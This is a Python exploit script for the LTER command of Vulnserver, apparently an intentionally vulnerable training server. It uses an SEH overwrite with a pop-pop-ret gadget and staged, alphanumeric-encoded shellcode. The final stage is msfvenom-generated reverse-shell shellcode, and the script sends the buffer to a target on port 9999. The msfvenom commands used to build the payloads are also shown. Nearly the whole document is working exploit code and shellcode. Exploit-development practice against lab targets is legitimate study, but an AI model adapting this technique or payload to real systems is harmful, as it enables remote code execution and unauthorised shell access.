#########################################################################################
# Title: Vulnserver LTER command SEH exploit
# Author: Marco Lugo
# Description: execute second stage -> jump to the larger buffer holding third stage
#              shellcode holding the final payload
#
#              To get Stephen Bradshaw's Vulnserver, visit:
#              http://www.thegreycorner.com/2010/12/introducing-vulnserver.html
#########################################################################################

import socket
import sys
import os
import struct

pop_pop_ret = struct.pack('<I', 0x6250172B)
first_stage = '\x74\xFF\x41\x41' # Lands at 0x00B6FF5E
second_stage1 = ('\x2D\x30\x59\x59\x59' # SUB EAX,0x59595930 ; EAX is already 0x00000000
                 '\x2D\x30\x59\x78\x59' # SUB EAX,0x59785930
                 '\x2D\x31\x4E\x77\x4C' # SUB EAX,0x4C774E31
                 '\x50' # PUSH EAX
                 '\x5B') # POP EBX ; EBX (0x00B6FF6E) is now aligned with EIP and thus we can use an alphanumeric encoder for the rest of the 2nd stage
second_stage2 = ('\x81\xC4\x00\x04\x00\x00' # ADD ESP,0x400
                 '\xFF\xE4')  # JMP ESP ; this jumps to the initial buffer (0x00B6F24C) where we have 3000+ bytes
# echo -ne "\x81\xC4\x00\x04\x00\x00\xFF\xE4" | msfvenom -p - -a x86 --platform windows -e x86/alpha_mixed BufferRegister=EBX -f c
second_stage2_encoded = "\x53\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49\x6b\x31\x59\x54\x53\x30\x64\x44\x67\x70\x53\x30\x59\x6f\x4b\x54\x41\x41"
second_stage = second_stage1 + second_stage2_encoded
# msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -a x86 --platform windows -e x86/alpha_mixed BufferRegister=ESP -f raw
third_stage = 'TYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIilKXMRUPwpC0E0oy8evQKp2DnkF0Tpnkf2dLnkF2VtnkcBdhtOH71ZWVfQYonLUlqqsLDBdlupIQhOTMeQYWzBKBSbV7LKbrR0lKpJGLnkblb1QhxcRhwqXQ3aLKCiq0Vakcnk0I28XcUj0InkVTnkfaxVUaKOnLo1XOvmvazgfXM0bUhvVcQmXxGKQmwTCE9tv8nk0XGTWqZsrFLKVlbkLKrx5L6aN3lKUTnkeQ8PK9PDdd5tckSkqqF92zCaKOKPSosoBznkVrZKnmSmrHUcTrS0gp58rWpsdrcoF4CX0Ld7Uv7wyojuX8lPc15PS0a9HDrt0PQxGYOprK5Pyozuf02pV0F0cpV0aPf0sX9zDOiOm0IoyEj7rJc5sXqo5Pc0s1RHfbGp4QClk9KVCZB0aF1G2HLYoU3Du1YoJumUIPsDDLYopN6h458lU8jPx5NBqFYoyE58e30mat30oyzC67PWaG01l62JfrqIQFJBImu6ZgpDgTGLc17qnmRdFDb0o6s0W4V4BpBv0VBvbfsfbnpVqFaCv6BHRYXLeoNfIoKeLIYpBnrv3vyo4p3XwxMWEM1pIon5MkJPh5Y2cfPhNFMEMmOmyoXUgLtFCLeZMPkKIpQeC5Mkw723qb2OSZ7p2syon5AA'

target_ip = sys.argv[1]
buffer = 'LTER /.:/' 
buffer += '\x41'*23 + third_stage + '\x41'*(1999-23-len(third_stage)) + '\x42'*(1496-126) + second_stage
buffer += '\x42'*(126-len(second_stage)) + first_stage + pop_pop_ret + '\x43'*1697

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((target_ip, 9999))
sock.recv(1024)
sock.send(buffer)
sock.close()
